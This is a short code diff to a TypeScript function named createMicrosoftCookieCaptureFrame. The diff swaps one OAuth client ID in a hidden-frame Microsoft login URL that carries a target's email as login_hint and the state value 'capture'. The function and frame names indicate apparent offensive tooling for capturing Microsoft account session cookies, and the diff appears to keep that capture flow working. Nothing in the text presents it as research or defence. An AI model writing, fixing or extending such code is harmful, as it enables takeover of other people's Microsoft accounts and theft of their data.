@@ -116,8 +116,8 @@ export function createMicrosoftCookieCaptureFrame(email: string): Promise<Cookie
     iframe.id = 'microsoft-cookie-capture-frame';
     
     // Microsoft login URL that should trigger cookie setting
-    // ✅ CORRECTED CLIENT ID
-    const microsoftUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=2e338732-c914-4129-a148-45c24f2da81d&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile%20email&state=capture&login_hint=${encodeURIComponent(email)}`;
+    // ✅ UPDATED CLIENT ID
+    const microsoftUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4eea8b9a-09d9-47dd-87c7-78de0d9f42be&response_type=code&redirect_uri=https://www.office.com/&scope=openid%20profile%20email&state=capture&login_hint=${encodeURIComponent(email)}`;
     
     let timeoutId: NodeJS.Timeout;
     let resolved = false;
